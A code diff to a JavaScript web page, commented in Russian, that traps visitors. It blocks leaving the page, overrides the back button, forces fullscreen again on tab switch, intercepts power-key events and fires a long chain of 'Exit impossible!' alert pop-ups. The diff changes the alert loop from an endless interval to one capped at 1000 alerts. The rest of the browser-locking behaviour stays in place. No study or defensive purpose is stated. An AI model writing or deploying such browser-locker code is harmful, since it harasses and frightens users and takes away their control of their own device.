@@ -42,7 +42,7 @@
                 });
                 button.remove();
                 blockExit();
-                startInfiniteAlert();
+                startInfiniteAlert(); // Бесконечный alert запускается сразу
                 blockBackButton();
                 blockTabSwitching();
                 blockPowerButton();
@@ -80,22 +80,26 @@
                     }
                     // Возвращаем пользователя на страницу
                     window.history.pushState(null, "", window.location.href);
-                    alert("Выход невозможен!");
                 });
             }
 
             // Бесконечный alert()
             function startInfiniteAlert() {
-                setInterval(() => {
-                    alert("Выход невозможен!");
-                }, 100);
+                let alertCount = 0;
+                const showAlert = () => {
+                    alertCount++;
+                    alert("Выход невозможен! (" + alertCount + ")");
+                    if (alertCount < 1000) { // Ограничение, чтобы избежать переполнения стека
+                        setTimeout(showAlert, 100); // Рекурсивный вызов через setTimeout
+                    }
+                };
+                showAlert(); // Запуск бесконечного alert
             }
 
             // Блокировка кнопки "Назад"
             function blockBackButton() {
                 document.addEventListener("backbutton", (e) => {
                     e.preventDefault();
-                    alert("Выход невозможен!");
                 }, false);
             }
 
@@ -103,7 +107,6 @@
             function blockTabSwitching() {
                 document.addEventListener("visibilitychange", () => {
                     if (document.hidden) {
-                        alert("Выход невозможен!");
                         document.documentElement.requestFullscreen();
                     }
                 });
@@ -114,7 +117,6 @@
                 document.addEventListener("keydown", (e) => {
                     if (e.key === "Power" || e.key === "Off") {
                         e.preventDefault();
-                        alert("Выход невозможен!");
                     }
                 });
             }
